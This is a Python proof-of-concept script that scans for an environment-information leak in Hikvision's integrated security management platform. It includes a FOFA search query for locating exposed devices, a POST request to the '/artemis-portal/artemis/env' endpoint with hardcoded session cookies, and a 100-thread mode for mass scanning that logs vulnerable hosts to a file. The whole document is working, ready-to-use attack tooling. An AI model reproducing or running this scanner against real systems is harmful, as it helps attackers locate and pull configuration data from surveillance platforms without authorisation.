#Hikvision综合安防管理平台env信息泄漏漏洞

# fofa语法：body="/portal/skin/isee/redblack/"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

 _                                               _            
(_)                                             | |           
 _ ___  ___  ___ _   _ _ __ ___    ___ ___ _ __ | |_ ___ _ __ 
| / __|/ _ \/ __| | | | '__/ _ \  / __/ _ \ '_ \| __/ _ \ '__|
| \__ \  __/ (__| |_| | | |  __/ | (_|  __/ | | | ||  __/ |   
|_|___/\___|\___|\__,_|_|  \___|  \___\___|_| |_|\__\___|_|   
                                                              
                                                              

"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="Hikvision")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/artemis-portal/artemis/env'
    url = target + url_payload
    header = {
        'Cookie': 'portal_locale_cookie=zh_CN; portal_locale_cookie.sig=VGxNpP7F4XZ1Gp3jFG_eDaYRyjAPOrprGsuvEUOU4_s; portal_sess=kHH2Ep5G2JqV0MEWfA444nhCN81_7r_5d3dej3vbcuY6BOndQait1dGdcp17PxTS; portal_locale_cookie=zh_CN; portal_locale_cookie.sig=VGxNpP7F4XZ1Gp3jFG_eDaYRyjAPOrprGsuvEUOU4_s; portal_locale_cookie_egg=zh_CN; portal_locale_cookie_egg.sig=w1ywwaZdZHDklrBdqaDLkbkaT6pDsqBnY3Yx5WYGaDo; portal_type_cookie=iportal; portal_type_cookie.sig=UCZaF8EkRMH4dmm8_FyX0-kK5EmKE5pVSkOszTqKyzs',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': "Windows",
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Priority': 'u=0, i',
        'Connection': 'close'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,verify=False)
        if res.status_code == 200 and '@bic' in res.text:
            print(f"f[+]该url存在信息泄漏漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该站点{target}不存在信息泄漏漏洞")
    except Exception as e:
        print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ == '__main__':
    main()